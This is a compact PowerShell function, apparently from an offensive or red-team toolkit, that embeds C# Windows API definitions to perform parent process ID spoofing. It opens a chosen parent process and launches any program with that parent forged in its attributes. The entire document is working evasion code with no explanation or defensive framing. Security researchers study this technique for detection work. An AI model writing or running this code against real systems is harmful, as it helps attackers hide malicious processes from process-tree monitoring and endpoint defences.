function PPID-Spoof{param([Parameter(Mandatory=$True)][int]$ppid,[Parameter(Mandatory=$True)][string]$spawnto)Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{public IntPtr hProcess;public IntPtr hThread;public uint dwProcessId;public uint dwThreadId;}
[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct STARTUPINFOEX
{public STARTUPINFO StartupInfo;public IntPtr lpAttributeList;}
[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{public int nLength;public IntPtr lpSecurityDescriptor;public int bInheritHandle;}
[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct STARTUPINFO
{public uint cb;public string lpReserved;public string lpDesktop;public string lpTitle;public uint dwX;public uint dwY;public uint dwXSize;public uint dwYSize;public uint dwXCountChars;public uint dwYCountChars;public uint dwFillAttribute;public uint dwFlags;public short wShowWindow;public short cbReserved2;public IntPtr lpReserved2;public IntPtr hStdInput;public IntPtr hStdOutput;public IntPtr hStdError;}
public static class Kernel32{[DllImport("kernel32.dll",SetLastError=true)]
public static extern IntPtr OpenProcess(UInt32 processAccess,bool bInheritHandle,int processId);[DllImport("kernel32.dll",SetLastError=true)]
[return:MarshalAs(UnmanagedType.Bool)]
public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList,int dwAttributeCount,int dwFlags,ref IntPtr lpSize);[DllImport("kernel32.dll",SetLastError=true)]
[return:MarshalAs(UnmanagedType.Bool)]
public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList,uint dwFlags,IntPtr Attribute,IntPtr lpValue,IntPtr cbSize,IntPtr lpPreviousValue,IntPtr lpReturnSize);[DllImport("kernel32.dll",SetLastError=true)]
public static extern bool CreateProcess(string lpApplicationName,string lpCommandLine,ref SECURITY_ATTRIBUTES lpProcessAttributes,ref SECURITY_ATTRIBUTES lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,[In]ref STARTUPINFOEX lpStartupInfo,out PROCESS_INFORMATION lpProcessInformation);[DllImport("kernel32.dll")]
public static extern bool ProcessIdToSessionId(uint dwProcessId,out uint pSessionId);[DllImport("kernel32.dll")]
public static extern uint GetCurrentProcessId();}
"@
$c=0
$d=0
$e=[Kernel32]::GetCurrentProcessId()
$f=[Kernel32]::ProcessIdToSessionId($e,[ref]$c)
$i=[Kernel32]::ProcessIdToSessionId($ppid,[ref]$d)
$l=New-Object StartupInfo
$m=New-Object STARTUPINFOEX
$n=New-Object PROCESS_INFORMATION
$o=New-Object SECURITY_ATTRIBUTES
$o.nLength=[System.Runtime.InteropServices.Marshal]::SizeOf($o)
$l.cb=[System.Runtime.InteropServices.Marshal]::SizeOf($m)
$t=[IntPtr]::Zero
$m.StartupInfo=$l
$w=[Kernel32]::OpenProcess(0x1fffff,0,$ppid)
$y=[IntPtr]::Zero
$y=[System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($y,$w)
$C=(Get-Item -Path ".\" -Verbose).FullName
$f=[Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero,1,0,[ref]$t)
$m.lpAttributeList=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($t)
$f=[Kernel32]::InitializeProcThreadAttributeList($m.lpAttributeList,1,0,[ref]$t)
$f=[Kernel32]::UpdateProcThreadAttribute($m.lpAttributeList,0,0x00020000,$y,[IntPtr]::Size,[IntPtr]::Zero,[IntPtr]::Zero)
$f=[Kernel32]::CreateProcess($spawnto,[IntPtr]::Zero,[ref]$o,[ref]$o,0,0x00080010,[IntPtr]::Zero,$C,[ref] $m,[ref] $n)}